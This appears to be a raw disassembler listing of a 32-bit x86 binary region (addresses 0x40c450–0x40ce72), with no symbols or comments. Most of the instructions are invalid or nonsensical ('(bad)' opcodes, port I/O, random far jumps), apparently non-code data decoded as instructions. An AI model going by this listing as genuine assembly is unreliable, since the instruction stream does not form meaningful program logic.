  40c450:	(bad)  
  40c451:	call   0x62981639
  40c456:	hlt    
  40c457:	test   DWORD PTR [edx-0xfe0527],0xffff9979
  40c461:	call   0x4435184b
  40c466:	or     al,0x48
  40c468:	mov    ebx,DWORD PTR [edi-0x17669ec7]
  40c46e:	push   cs
  40c46f:	test   BYTE PTR [edi+0xc7caee],bh
  40c475:	jmp    0x315d3b88
  40c47a:	pop    ds
  40c47b:	inc    eax
  40c47c:	add    BYTE PTR [ebx],dl
  40c47e:	or     eax,0xc975447d
  40c483:	outs   dx,DWORD PTR ds:[esi]
  40c484:	mov    WORD PTR [ecx],gs
  40c486:	or     DWORD PTR [eax-0x1],edx
  40c489:	call   0x6e49:0x6c0bbe92
  40c490:	sbb    bl,dl
  40c492:	or     eax,0x615d447b
  40c497:	push   0x500ea98c
  40c49c:	inc    DWORD PTR [eax]
  40c49e:	pop    ss
  40c49f:	add    edx,0xdc4710c
  40c4a5:	test   DWORD PTR [esi+0x4],eax
  40c4a8:	add    BYTE PTR [eax],al
  40c4aa:	cmp    DWORD PTR [edi+0x32],edi
  40c4ad:	inc    DWORD PTR [eax]
	...
  40c4cb:	add    BYTE PTR [ebx],ch
  40c4cd:	aad    0x4e
  40c4cf:	call   0x40549b
  40c4d4:	xor    ah,al
  40c4d6:	or     eax,0x33784
  40c4db:	add    BYTE PTR [edx-0x54cb447e],al
  40c4e1:	(bad)  
  40c4e2:	std    
  40c4e3:	add    ah,BYTE PTR [ecx]
  40c4e5:	icebp  
  40c4e6:	jle    0x40c4a5
  40c4e8:	pop    esp
  40c4e9:	(bad)  
  40c4ea:	std    
  40c4eb:	jmp    FWORD PTR [ebx]
  40c4ed:	in     eax,0x92
  40c4ef:	rcr    BYTE PTR [edi+0x1e],0x66
  40c4f3:	sbb    DWORD PTR [ecx+0x4bffff19],0xe
  40c4fa:	jne    0x40c517
  40c4fc:	ficom  WORD PTR [ebx]
  40c4fe:	lea    eax,[ebp-0x22998]
  40c504:	add    al,0x4c
  40c506:	xchg   esp,eax
  40c507:	mov    ah,BYTE PTR [esp+eax*1]
  40c50a:	call   ebx
  40c50c:	out    0xa8,eax
  40c50e:	or     dh,bh
  40c510:	dec    esp
  40c511:	sti    
  40c512:	mov    edi,0xca74fe
  40c517:	xor    ah,BYTE PTR [ecx+ebp*2-0x41]
  40c51b:	push   fs
  40c51d:	add    DWORD PTR es:[eax],eax
  40c520:	xor    al,0x6a
  40c522:	push   es
  40c523:	mov    esi,DWORD PTR [esp+eiz*2+0x68240000]
  40c52a:	dec    esp
  40c52b:	hlt    
  40c52c:	popf   
  40c52d:	daa    
  40c52e:	call   0x40c5be
	...
  40c54b:	add    BYTE PTR [eax],al
  40c54d:	add    ah,bh
  40c54f:	mov    ebp,0xf0de443
  40c554:	jb     0x40c596
  40c556:	or     eax,0x88ec7060
  40c55b:	das    
  40c55c:	cli    
  40c55d:	cmp    DWORD PTR [ecx],0xffffffd8
  40c560:	add    al,BYTE PTR [eax]
  40c562:	loop   0x40c5cb
  40c564:	xchg   ebx,eax
  40c565:	add    BYTE PTR ds:0xe94c77d7,cl
  40c56b:	mov    WORD PTR [ebx],es
  40c56d:	push   ecx
  40c56e:	pop    ebp
  40c56f:	(bad)  
  40c571:	xchg   esp,eax
  40c572:	or     eax,0xc14dbd7
  40c577:	xlat   BYTE PTR ds:[ebx]
  40c578:	add    cl,BYTE PTR [ebx-0x704cfdf6]
  40c57e:	or     al,0xd7
  40c580:	add    cl,BYTE PTR [ebp+0x275d3438]
  40c586:	xor    eax,0x8be7b95e
  40c58b:	jle    0x40c58f
  40c58d:	add    BYTE PTR [ecx-0x7a7c076a],dl
  40c593:	(bad)  
  40c594:	add    al,BYTE PTR [eax]
  40c596:	out    0xe3,eax
  40c598:	jne    0x40c5de
  40c59a:	jns    0x40c5a2
  40c59c:	ja     0x40c5e2
  40c59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c59f:	push   es
  40c5a0:	jmp    0x430996b9
  40c5a5:	add    BYTE PTR [esi+0x21a483e1],al
  40c5ab:	mov    eax,ds:0x560dfee8
  40c5b0:	les    eax,FWORD PTR [ebx]
	...
  40c5ce:	add    BYTE PTR [eax],al
  40c5d0:	mov    ds,WORD PTR [edx+0x63884ff7]
  40c5d6:	sbb    dh,bh
  40c5d8:	xor    al,BYTE PTR [ecx-0x29580425]
  40c5de:	add    ch,BYTE PTR [edx-0xf]
  40c5e1:	or     al,0x77
  40c5e3:	dec    esp
  40c5e4:	push   ebp
  40c5e5:	dec    ebx
  40c5e6:	jg     0x40c613
  40c5e8:	adc    edi,edi
  40c5ea:	gs jmp 0x41df8e2
  40c5f0:	or     eax,0xfaabd380
  40c5f5:	mul    BYTE PTR [esi+esi*4-0xe]
  40c5f9:	out    0xe8,eax
  40c5fb:	sub    DWORD PTR [ecx-0x56],0xffffffe8
  40c5ff:	clc    
  40c600:	mov    ebx,DWORD PTR [eax+0x330d03e8]
  40c606:	adc    bl,BYTE PTR [esi+0xd]
  40c609:	inc    ebx
  40c60a:	je     0x40c643
  40c60c:	fnstsw WORD PTR [ebx+0x1e]
  40c60f:	fdiv   QWORD PTR [eax-0x77fc1844]
  40c615:	jge    0x40c5ef
  40c617:	jmp    0x76d9adcf
  40c61c:	push   eax
  40c61d:	or     al,0x11
  40c61f:	stos   DWORD PTR es:[edi],eax
  40c620:	and    al,0x0
  40c622:	jmp    0x3276271f
  40c627:	pop    esi
  40c628:	cmovp  esi,eax
  40c62b:	xchg   ecx,eax
  40c62c:	xor    al,BYTE PTR [edx]
  40c62e:	jmp    0x6a025c36
  40c633:	fild   DWORD PTR [eax]
	...
  40c651:	add    dh,ch
  40c653:	imul   esi,DWORD PTR [edi],0x1d
  40c656:	dec    edi
  40c657:	ins    BYTE PTR es:[edi],dx
  40c658:	sbb    ebx,DWORD PTR ds:0x1cfc6c4f
  40c65e:	dec    edi
  40c65f:	ins    BYTE PTR es:[edi],dx
  40c660:	lock test BYTE PTR [edx+0x46],dh
  40c664:	xor    eax,0x1cc2260d
  40c669:	arpl   si,si
  40c66b:	rcl    DWORD PTR [ebx],0x47
  40c66e:	xchg   esi,eax
  40c66f:	cmp    eax,0x4d3a7ce1
  40c674:	mov    ?,WORD PTR [ebx+0x3e9018e]
  40c67a:	xor    eax,0xd05f0ed
  40c67f:	(bad)  
  40c681:	and    dl,BYTE PTR [ecx-0x5c15469c]
  40c687:	cmp    ecx,DWORD PTR [ebx-0x85f954]
  40c68d:	mov    dh,0x81
  40c68f:	xchg   edi,eax
  40c690:	sub    eax,0xe
  40c693:	add    al,ch
  40c695:	xor    eax,0x1f520000
  40c69b:	jnp    0x40c6e1
  40c69d:	icebp  
  40c69e:	cmp    al,0x83
  40c6a0:	mov    edi,0xb83463e1
  40c6a5:	inc    ecx
  40c6a6:	and    bl,dl
  40c6a8:	(bad)  
  40c6a9:	call   0x10c3cd97
  40c6ae:	bound  ebp,QWORD PTR [ecx+ecx*1-0x3e]
  40c6b2:	js     0x40c71f
  40c6b4:	pop    ss
  40c6b5:	popa   
	...
  40c6d2:	add    BYTE PTR [eax],al
  40c6d4:	inc    ebx
  40c6d5:	lock jmp 0x30fe:0xf04426ea
  40c6dd:	lock push ebp
  40c6df:	bound  ebp,QWORD PTR [ebx]
  40c6e1:	clc    
  40c6e2:	and    BYTE PTR [edi],0x96
  40c6e5:	fidivr WORD PTR [eax-0x47]
  40c6e8:	adc    DWORD PTR [eax],eax
  40c6ea:	pop    edi
  40c6eb:	aas    
  40c6ec:	(bad)  
  40c6ed:	mov    eax,0x4d0eedc1
  40c6f2:	mov    edi,DWORD PTR [ebp+0x68f7e28e]
  40c6f8:	inc    ebp
  40c6f9:	xor    al,BYTE PTR [ebx]
  40c6fb:	jmp    0xe9ab150e
  40c700:	mov    ah,0xff
  40c702:	mov    WORD PTR ds:0xb7e8102d,fs
  40c708:	dec    esi
  40c709:	(bad)  
  40c70a:	push   DWORD PTR [ecx-0x44]
  40c70d:	test   DWORD PTR [edx+0x43eb7ef],0xc1bf560
  40c717:	add    BYTE PTR [edi-0x237cf7dd],bl
  40c71d:	(bad)  
  40c71e:	dec    BYTE PTR [ecx-0x75efe010]
  40c724:	in     al,dx
  40c725:	out    0x81,eax
  40c727:	pusha  
  40c728:	cld    
  40c729:	add    DWORD PTR [eax-0x75eff7b4],ecx
  40c72f:	dec    eax
  40c730:	icebp  
  40c731:	imul   ecx,DWORD PTR [ebx+0x24],0x8b0d6af9
	...
  40c754:	add    BYTE PTR [eax],al
  40c756:	mov    ah,0x11
  40c758:	mov    DWORD PTR [eax+ecx*1-0xc],eax
  40c75c:	test   cl,cl
  40c75e:	cwde   
  40c75f:	jecxz  0x40c6ea
  40c761:	add    esi,ecx
  40c763:	cld    
  40c764:	(bad)  
  40c765:	adc    bl,dh
  40c767:	push   ebp
  40c768:	add    al,0x8d
  40c76a:	push   0x34e80c05
  40c76f:	xlat   BYTE PTR ds:[ebx]
  40c770:	std    
  40c771:	(bad)  
  40c772:	jp     0x40c73d
  40c774:	imul   ebp,edx,0xffffffb5
  40c777:	add    DWORD PTR [ebp-0x1916378c],ecx
  40c77d:	(bad)
  40c780:	push   DWORD PTR [edx]
  40c782:	in     al,0x3d
  40c784:	mov    esp,ebp
  40c786:	rol    ecx,1
  40c788:	add    al,BYTE PTR [eax]
  40c78a:	cmp    DWORD PTR [ecx-0x15],ebp
  40c78d:	push   ecx
  40c78e:	aaa    
  40c78f:	ss push edi
  40c791:	mov    ebx,DWORD PTR [edx+ebp*2+0x46]
  40c795:	add    al,0x3c
  40c797:	dec    ebp
  40c798:	mov    dl,0x0
  40c79a:	je     0x40c806
  40c79c:	jbe    0x40c7a2
  40c79e:	out    0x5f,eax
  40c7a0:	cld    
  40c7a1:	add    BYTE PTR [ecx+0x73530c3a],dh
  40c7a7:	adc    BYTE PTR [eax],bl
  40c7a9:	adc    dh,ah
  40c7ab:	sti    
  40c7ac:	mov    al,BYTE PTR [esi]
  40c7ae:	or     eax,0x1c73c354
  40c7b3:	bound  ebp,QWORD PTR [ebp+0x4]
  40c7b6:	mov    ?,WORD PTR [ebp+0x7402]
	...
  40c7d8:	push   cs
  40c7d9:	inc    ax
  40c7db:	cld    
  40c7dc:	mov    ss,WORD PTR [ebp+0x689847fe]
  40c7e2:	push   edx
  40c7e3:	jmp    DWORD PTR [eax]
  40c7e5:	sti    
  40c7e6:	adc    DWORD PTR [eax+0xd],eax
  40c7e9:	pop    eax
  40c7ea:	push   0x2d7cffc
  40c7ef:	add    BYTE PTR [ebx-0x1e],bh
  40c7f2:	jns    0x40c840
  40c7f4:	adc    eax,0x4973bc54
  40c7f9:	jb     0x40c7ff
  40c7fb:	jmp    0x40c816
  40c7fd:	sar    edx,0xe7
  40c800:	in     eax,dx
  40c801:	aas    
  40c802:	add    al,0x0
  40c804:	xchg   esi,eax
  40c805:	mov    ebx,0x5bbd8afa
  40c80a:	in     eax,dx
  40c80b:	jae    0x40c7fe
  40c80d:	add    BYTE PTR [edx],0x56
  40c810:	and    eax,0xd3f8cb9
  40c815:	jo     0x40c81c
  40c817:	mov    DWORD PTR [ebx],esp
  40c819:	fstp   TBYTE PTR [ecx+0x7e]
  40c81c:	adc    DWORD PTR [edi+0x2],edi
  40c81f:	add    BYTE PTR ds:0xbf7adad7,al
  40c825:	(bad)  
  40c826:	add    al,BYTE PTR [ebp+ecx*2+0x6556124b]
  40c82d:	test   eax,0x5c0d00da
  40c832:	leave  
  40c833:	jae    0x40c84a
  40c835:	jb     0x40c838
  40c837:	mov    edx,DWORD PTR [esi+0x50]
  40c83a:	add    edi,edi
	...
  40c858:	add    BYTE PTR [eax],al
  40c85a:	std    
  40c85b:	or     eax,0x98445b46
  40c860:	(bad)  
  40c861:	jmp    eax
  40c863:	push   DWORD PTR [ecx-0x28]
  40c866:	(bad)  
  40c867:	shr    esp,cl
  40c869:	push   eax
  40c86a:	dec    al
  40c86c:	ds dec ebp
  40c86e:	xchg   dh,ch
  40c870:	pop    edi
  40c871:	inc    edi
  40c872:	sub    DWORD PTR [eax],ebp
  40c874:	stos   BYTE PTR es:[edi],al
  40c875:	jo     0x40c86f
  40c877:	jbe    0x40c89c
  40c879:	lock xor ah,BYTE PTR [eax+0x5a0d02f7]
  40c880:	call   0xd32919ff
  40c885:	sti    
  40c886:	xchg   ecx,eax
  40c887:	cmp    eax,0xfce65455
  40c88c:	ret    0x5e02
  40c88f:	dec    edi
  40c890:	bound  edi,QWORD PTR [edi]
  40c892:	adc    eax,0xf5509a4f
  40c897:	pop    esi
  40c898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c899:	add    DWORD PTR ds:0xd6293077,ecx
  40c89f:	ins    BYTE PTR es:[edi],dx
  40c8a0:	(bad)  
  40c8a1:	fild   DWORD PTR [esi+0x71]
  40c8a4:	call   0x600ec6ac
  40c8a9:	jl     0x40c8ca
  40c8ab:	add    cl,ch
  40c8ad:	in     al,dx
  40c8ae:	mov    ebp,0xcc832577
  40c8b3:	mov    dl,al
  40c8b5:	add    ecx,DWORD PTR ds:0xa52dfe4e
  40c8bb:	adc    ah,BYTE PTR [ebx+0x2]
	...
  40c8d9:	add    BYTE PTR [eax],al
  40c8db:	add    BYTE PTR ds:0x47e7a379,cl
  40c8e1:	mov    edi,0x45452966
  40c8e6:	in     eax,dx
  40c8e7:	outs   dx,DWORD PTR ds:[esi]
  40c8e8:	inc    ebx
  40c8e9:	ja     0x40c928
  40c8eb:	je     0x40c873
  40c8ed:	mov    dh,0xc0
  40c8ef:	ja     0x40c96c
  40c8f1:	add    ecx,ebp
  40c8f3:	pop    ebp
  40c8f4:	mov    gs,eax
  40c8f6:	(bad)  
  40c8f7:	jno    0x40c92c
  40c8f9:	ja     0x40c8fa
  40c8fb:	sub    bh,cl
  40c8fd:	es ret 
  40c8ff:	xor    eax,0xd557750c
  40c904:	sub    DWORD PTR [ebp+0x4],ebp
  40c907:	ins    BYTE PTR es:[edi],dx
  40c908:	int3   
  40c909:	aaa    
  40c90a:	divps  xmm6,XMMWORD PTR [esi]
  40c90d:	jmp    0xb123:0x4e67f2d8
  40c914:	mov    edi,0xa3f174e2
  40c919:	cmp    al,0x8
  40c91b:	xor    edx,0x85e8ffcd
  40c921:	jmp    0x72fe:0xe2f498e7
  40c928:	cmp    esp,esp
  40c92a:	pop    esi
  40c92b:	mov    bh,0x45
  40c92d:	mov    ecx,0x4d0ee1c1
  40c932:	mov    edx,DWORD PTR [ebp-0x73]
  40c935:	fdivrp st(7),st
  40c937:	push   0xffffffc2
  40c939:	push   es
  40c93a:	mov    BYTE PTR [ebp+0x29330bf2],ch
	...
  40c95c:	add    BYTE PTR [eax],al
  40c95e:	pop    ebp
  40c95f:	pop    edx
  40c960:	mov    DWORD PTR [ebp+0x42330922],ebp
  40c966:	dec    eax
  40c967:	test   al,0x4f
  40c969:	in     al,dx
  40c96a:	push   cs
  40c96b:	add    BYTE PTR [edi-0x79],dl
  40c96e:	daa    
  40c96f:	aas    
  40c970:	and    al,0xca
  40c972:	pusha  
  40c973:	ds and al,0xef
  40c976:	push   cs
  40c977:	jns    0x40c9d4
  40c979:	int    0xfe
  40c97b:	js     0x40c9d8
  40c97d:	lds    ebx,FWORD PTR [edx]
  40c97f:	mov    edx,0x1e0d43
  40c984:	mov    ebx,DWORD PTR [ecx+ecx*1+0x77]
  40c988:	push   es
  40c989:	rcl    DWORD PTR [esi*1-0x5d6d16ff],0xe
  40c991:	add    al,dh
  40c993:	jnp    0x40c993
  40c995:	jmp    DWORD PTR [esp+edx*2+0x1]
  40c999:	push   0x61
  40c99b:	pop    DWORD PTR [edx+0x24]
  40c99e:	or     al,0x2c
  40c9a0:	mov    eax,DWORD PTR [ebp+0x38]
  40c9a3:	push   esp
  40c9a4:	add    BYTE PTR [edx+0x24],ch
  40c9a7:	push   esp
  40c9a8:	add    al,0xe8
  40c9aa:	test   eax,0xaf00023a
  40c9af:	retf   
  40c9b0:	xor    esi,0x1b
  40c9b3:	jp     0x40c9c6
  40c9b5:	add    DWORD PTR [esi+edi*8],esp
  40c9b8:	mov    BYTE PTR [bx],dh
  40c9bb:	(bad)  
  40c9bc:	(bad)  
  40c9bd:	inc    bl
  40c9bf:	aad    0x65
  40c9c1:	dec    ecx
	...
  40c9de:	add    BYTE PTR [eax],al
  40c9e0:	cmc    
  40c9e1:	std    
  40c9e2:	mov    bh,al
  40c9e4:	addr16 (bad) 
  40c9e7:	jl     0x40c9d6
  40c9e9:	aad    0x25
  40c9eb:	cli    
  40c9ec:	hlt    
  40c9ed:	std    
  40c9ee:	mov    al,bh
  40c9f0:	aas    
  40c9f1:	adc    cl,BYTE PTR [ebx-0x328d6b82]
  40c9f7:	call   0x40b821
  40c9fc:	sar    BYTE PTR [edx-0xa],cl
  40c9ff:	add    al,0xbb
  40ca01:	jnp    0x40c9df
  40ca03:	add    BYTE PTR [ebp+edi*8+0x2da0478c],ah
  40ca0a:	call   DWORD PTR ds:0x3eec9c
  40ca10:	cld    
  40ca11:	sti    
  40ca12:	stc    
  40ca13:	add    BYTE PTR [edx+ecx*1+0x191889c0],ah
  40ca1a:	sbb    al,0x40
  40ca1c:	test   ebx,0xdf8275fd
  40ca22:	inc    edx
  40ca23:	and    al,0x6b
  40ca25:	jge    0x40caa1
  40ca27:	and    al,0xd
  40ca29:	fiadd  DWORD PTR ds:0xe3468f0f
  40ca2f:	(bad)  
  40ca30:	(bad)  
  40ca31:	rcl    BYTE PTR [esi+0x15d75aff],1
  40ca37:	ror    BYTE PTR [esi-0x66f0fc51],0x80
  40ca3e:	add    al,BYTE PTR [eax]
  40ca40:	or     eax,0x244f6e
	...
  40ca61:	add    BYTE PTR [ecx],bl
  40ca63:	outs   dx,BYTE PTR ds:[esi]
  40ca64:	push   esp
  40ca65:	adc    BYTE PTR [eax-0x71fca97f],cl
  40ca6b:	cdq    
  40ca6c:	lea    edi,cs:[ebx+0x2b66ead2]
  40ca73:	fadd   DWORD PTR [edx]
  40ca75:	data16 mov ?,WORD PTR [edi+0x6]
  40ca79:	cmpps  xmm5,XMMWORD PTR [esi-0x74],0x7b
  40ca7e:	sub    edi,edi
  40ca80:	mov    dl,bl
  40ca82:	sbb    ebx,0x2781e1b
  40ca88:	xchg   DWORD PTR ds:0x6614cb0d,edi
  40ca8e:	es mov ebx,0xe622326
  40ca94:	pop    DWORD PTR [ebx+0x29]
  40ca97:	ret    
  40ca98:	adc    DWORD PTR [edi+0x3cc5d5ea],esi
  40ca9e:	or     eax,0x43ffa2d3
  40caa3:	(bad)  
  40caa4:	imul   eax,DWORD PTR [ebp+0x51fd82b2],0x18267298
  40caae:	nop
  40caaf:	xchg   edx,eax
  40cab0:	es adc al,0xa5
  40cab3:	arpl   bx,bp
  40cab5:	add    BYTE PTR ds:0x25245f5e,cl
  40cabb:	pop    esp
  40cabc:	ret    
  40cabd:	je     0x40cac7
  40cabf:	add    BYTE PTR [edi-0x180dceb8],ch
  40cac5:	mov    WORD PTR [eax],es
	...
  40cae3:	add    BYTE PTR [eax],dl
  40cae5:	jne    0x40cb43
  40cae7:	sub    BYTE PTR [ecx],cl
  40cae9:	fadd   DWORD PTR [ebx-0x25]
  40caec:	(bad)  
  40caed:	loopne 0x40cb3d
  40caef:	loope  0x40cabf
  40caf1:	sbb    ecx,DWORD PTR [eax]
  40caf3:	test   dh,dl
  40caf5:	sbb    esp,edi
  40caf7:	add    eax,eax
  40caf9:	adc    al,BYTE PTR [edi+0x1d]
  40cafc:	rcr    DWORD PTR [ebx],0xca
  40caff:	adc    BYTE PTR [ecx+0x33e19ec8],dl
  40cb05:	je     0x40cb33
  40cb07:	sub    ch,bh
  40cb09:	je     0x40cb26
  40cb0b:	hlt    
  40cb0c:	xchg   ebp,eax
  40cb0d:	(bad)  
  40cb0e:	jno    0x40cb57
  40cb10:	add    DWORD PTR [ebp+0x2c],esi
  40cb13:	sub    cl,bh
  40cb15:	jbe    0x40caf7
  40cb17:	xchg   ebx,eax
  40cb18:	or     eax,0x963d0f3f
  40cb1d:	in     eax,0xc3
  40cb1f:	lds    ecx,FWORD PTR [edx]
  40cb21:	add    BYTE PTR [ecx+0x30],dl
  40cb24:	hlt    
  40cb25:	add    cl,ch
  40cb27:	loopne 0x40cb87
  40cb29:	and    al,0xf9
  40cb2b:	jmp    0x40cabe
  40cb2d:	out    0xe7,eax
  40cb2f:	add    ebx,DWORD PTR [edi]
  40cb31:	rcl    BYTE PTR [ecx-0x19],0x39
  40cb35:	mov    eax,DWORD PTR [ebx+esi*1+0x5e]
  40cb39:	mov    edx,DWORD PTR [eax]
  40cb3b:	lea    ecx,[ecx+0xc]
  40cb3e:	neg    BYTE PTR [eax+0x7433e7ba]
  40cb44:	or     eax,0x476100
	...
  40cb65:	add    BYTE PTR [ecx+0x9572884],ch
  40cb6b:	adc    ebp,DWORD PTR [ecx]
  40cb6d:	in     eax,dx
  40cb6e:	sbb    DWORD PTR [edi],esi
  40cb70:	xchg   ecx,eax
  40cb71:	adc    ecx,DWORD PTR [esi]
  40cb73:	add    BYTE PTR [eax],al
  40cb75:	jmp    0xe9280bf0
  40cb7a:	push   cs
  40cb7b:	test   DWORD PTR [edi+0x16a1f5d],edi
  40cb81:	(bad)  
  40cb83:	(bad)  
  40cb85:	dec    edi
  40cb86:	push   ecx
  40cb87:	add    BYTE PTR [eax],al
  40cb89:	bound  eax,QWORD PTR [esi-0x16]
  40cb8c:	add    edx,edi
  40cb8e:	ins    DWORD PTR es:[edi],dx
  40cb8f:	test   dh,bh
  40cb91:	xor    al,0x5
  40cb93:	adc    eax,eax
  40cb95:	ret    0x8b03
  40cb98:	add    ah,BYTE PTR [edx-0x72]
  40cb9b:	pop    DWORD PTR [eax]
  40cb9d:	jmp    0x709101b0
  40cba2:	retf   
  40cba3:	fisttp DWORD PTR [edx+0x2f9dfd2c]
  40cba9:	adc    al,0x9
  40cbab:	add    BYTE PTR [esi+0x72],dl
  40cbae:	cmp    eax,0xf5847e7
  40cbb3:	add    BYTE PTR [ecx+ebp*4-0x4500da9e],al
  40cbba:	xchg   ecx,eax
  40cbbb:	dec    ebx
  40cbbc:	or     bl,dl
  40cbbe:	adc    DWORD PTR [ebx-0x17ce0e40],eax
  40cbc4:	mov    WORD PTR [ecx],gs
  40cbc6:	(bad)  
  40cbc8:	call   esp
	...
  40cbe6:	add    BYTE PTR [eax],al
  40cbe8:	ret    0x5489
  40cbeb:	fst    DWORD PTR [edx+ebp*2]
  40cbee:	sub    al,0xa1
  40cbf0:	or     ebp,0x42b4e7
  40cbf6:	add    BYTE PTR [ebp-0x32],ah
  40cbf9:	push   ebx
  40cbfa:	or     al,0x72
  40cbfc:	add    eax,0xdd72016a
  40cc01:	fisttp QWORD PTR [edi]
  40cc03:	fcmove st,st(6)
  40cc05:	jmp    0x3d162e0b
  40cc0a:	pop    edi
  40cc0b:	add    BYTE PTR [edi-0x37],ch
  40cc0e:	ror    BYTE PTR [esp+eiz*4],0x15
  40cc12:	mov    ebp,esp
  40cc14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc15:	mov    edi,esi
  40cc17:	mov    ah,BYTE PTR [ecx-0xa8a9f6]
  40cc1d:	jnp    0x40cbad
  40cc1f:	add    DWORD PTR [edx+eax*1+0x57],esp
  40cc23:	push   0x78
  40cc25:	sbb    cl,BYTE PTR [ebp+0x75eb5055]
  40cc2b:	xchg   ebx,eax
  40cc2c:	add    al,BYTE PTR gs:[eax+eax*8+0x7d82f918]
  40cc34:	add    BYTE PTR [ebx],0x74
  40cc37:	das    
  40cc38:	mov    ch,0x60
  40cc3a:	cld    
  40cc3b:	add    BYTE PTR [eax],ch
  40cc3d:	mov    ds:0xbd4a76fe,al
  40cc42:	jae    0x40cc40
  40cc44:	mov    WORD PTR [ecx-0x1b],ss
  40cc47:	add    DWORD PTR [ecx+ecx*4],esi
  40cc4a:	out    dx,al
  40cc4b:	test   DWORD PTR [eax],eax
	...
  40cc69:	add    BYTE PTR [edx-0x1674e7c9],bl
  40cc6f:	fisttp WORD PTR [ecx-0x74e913b3]
  40cc75:	(bad)  
  40cc76:	mov    WORD PTR [ebx+edx*4+0x1],cs
  40cc7a:	in     al,0x85
  40cc7c:	mov    esi,0xe813e275
  40cc81:	xchg   esp,eax
  40cc82:	pop    edx
  40cc83:	add    eax,DWORD PTR [eax]
  40cc85:	xor    dh,BYTE PTR [ebx*1+0x826c95e]
  40cc8c:	add    BYTE PTR [ebx+0x4387bda9],cl
  40cc92:	mov    eax,0xb5b0318c
  40cc97:	jmp    0x90ae:0xbea48bec
  40cc9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc9f:	add    DWORD PTR [eax],eax
  40cca1:	lea    ecx,ds:0x3508269b
  40cca7:	mov    bh,0x57
  40cca9:	add    BYTE PTR ds:0xa5580671,cl
  40ccaf:	or     BYTE PTR [ebx+0x0],dh
  40ccb2:	or     eax,0x980ec46b
  40ccb7:	daa    
  40ccb8:	ret    0xd03
  40ccbb:	sbb    al,0x8b
  40ccbd:	jmp    0x40cc45
  40ccbf:	and    al,0x10
  40ccc1:	cmp    DWORD PTR [ecx-0x1d],0x150d0003
  40ccc8:	sahf   
  40ccc9:	dec    DWORD PTR [edi+eiz*8]
  40cccc:	add    dl,BYTE PTR [edi+0x0]
	...
  40cceb:	add    BYTE PTR [edi+edx*8],dl
  40ccee:	push   eax
  40ccef:	jns    0x40ccd4
  40ccf1:	xchg   ebp,eax
  40ccf2:	push   edi
  40ccf3:	or     dh,bl
  40ccf5:	mov    esi,0xe70ce658
  40ccfa:	cmp    DWORD PTR [ebp+ebx*1-0x19],0xfc2a2456
  40cd02:	repz sub BYTE PTR [eax+0x73],0xdc
  40cd07:	(bad)  
  40cd08:	sbb    ah,bh
  40cd0a:	pop    DWORD PTR [ecx+ebx*1-0xa0121a3]
  40cd11:	fcom   QWORD PTR [edi+0x0]
  40cd14:	or     eax,0xc68ab562
  40cd19:	push   ebx
  40cd1a:	mov    bl,dh
  40cd1c:	repz cmp eax,0xbcbbe7de
  40cd22:	add    al,BYTE PTR [eax]
  40cd24:	mov    ecx,?
  40cd26:	inc    edi
  40cd27:	inc    ecx
  40cd28:	inc    ebx
  40cd29:	lods   al,BYTE PTR ds:[esi]
  40cd2a:	push   edi
  40cd2b:	cmp    eax,0x43f65
  40cd30:	or     eax,0x5b085264
  40cd35:	rol    DWORD PTR [eax],0x8d
  40cd38:	cmp    BYTE PTR [eax],al
  40cd3a:	icebp  
  40cd3b:	cmp    esp,DWORD PTR [ebp+0xd01fa0e]
  40cd41:	mov    DWORD PTR [ebx-0x1abf19f5],ebp
  40cd47:	pop    eax
  40cd48:	in     al,dx
  40cd49:	xchg   edi,eax
  40cd4a:	inc    BYTE PTR [ebx]
  40cd4c:	or     eax,0x1c8700
	...
  40cd6d:	add    BYTE PTR [ebx],dl
  40cd6f:	push   ebp
  40cd70:	fimul  WORD PTR [esi]
  40cd72:	mov    edx,0x9506205
  40cd77:	xor    BYTE PTR [eax+0x3],dh
  40cd7a:	add    BYTE PTR [eax-0xd],0x33
  40cd7e:	mov    esi,0xde5e5e7
  40cd83:	add    BYTE PTR [ecx-0x4fe99fd],bl
  40cd89:	ret    
  40cd8a:	mov    bl,0x3d
  40cd8c:	mov    al,0xc2
  40cd8e:	push   ss
  40cd8f:	add    BYTE PTR [ecx+ecx*4],bl
  40cd92:	ss jle 0x40cd51
  40cd95:	or     al,0xc
  40cd97:	add    cl,ch
  40cd99:	xor    eax,0x3969cda
  40cd9e:	or     eax,0x97d46200
  40cda3:	les    eax,FWORD PTR [esi]
  40cda5:	sbb    DWORD PTR ds:0x4d11ed55,esi
  40cdab:	call   0xc002dab5
  40cdb0:	sbb    ch,bl
  40cdb2:	jns    0x40cdbc
  40cdb4:	pop    esp
  40cdb5:	ss pop es
  40cdb7:	cs push ecx
  40cdb9:	mov    dh,0xe9
  40cdbb:	add    ecx,ebp
  40cdbd:	imul   ecx,DWORD PTR ds:0xe355127,0xfdebb8be
  40cdc7:	imul   ebp,eax,0xe7d86503
  40cdcd:	add    ecx,DWORD PTR ds:0xaeff8d
	...
  40cdef:	add    BYTE PTR [esi],dl
  40cdf1:	xor    BYTE PTR [edx-0x15],ch
  40cdf4:	xor    BYTE PTR [ecx+0x4537417],cl
  40cdfa:	pop    eax
  40cdfb:	adc    eax,DWORD PTR es:[ecx+eax*2-0x41]
  40ce00:	dec    ebx
  40ce01:	call   0x4dc9ae
  40ce06:	add    DWORD PTR [edx+eax*1+0x69c47400],0x54
  40ce0e:	or     al,0x6a
  40ce10:	stos   BYTE PTR es:[edi],al
  40ce11:	sar    ebp,cl
  40ce13:	out    dx,al
  40ce14:	pop    ecx
  40ce15:	fisttp DWORD PTR [ebx-0x122a994]
  40ce1b:	fidiv  WORD PTR [esi-0x5d]
  40ce1e:	jae    0x40ce09
  40ce20:	push   cs
  40ce21:	xchg   esi,eax
  40ce22:	(bad)  
  40ce23:	jmp    0xdd36:0x6c8d000e
  40ce2a:	(bad)  
  40ce2b:	mov    esi,0xe973e536
  40ce30:	push   cs
  40ce31:	nop
  40ce32:	add    BYTE PTR [esi],cl
  40ce34:	sti    
  40ce35:	enter  0xf1c1,0xe
  40ce39:	xor    eax,0xe78f8d8b
  40ce3e:	sbb    ebp,edx
  40ce40:	push   cs
  40ce41:	add    BYTE PTR [ebx+0x37],dl
  40ce44:	mov    ds,eax
  40ce46:	(bad)  
  40ce47:	jmp    0x869a:0xf72000e
  40ce4e:	pop    es
  40ce4f:	jmp    0x633fa834
	...
  40ce70:	add    BYTE PTR [eax],al
  40ce72:	fiadd  WORD PTR [edi-0x3eeaa2b4]
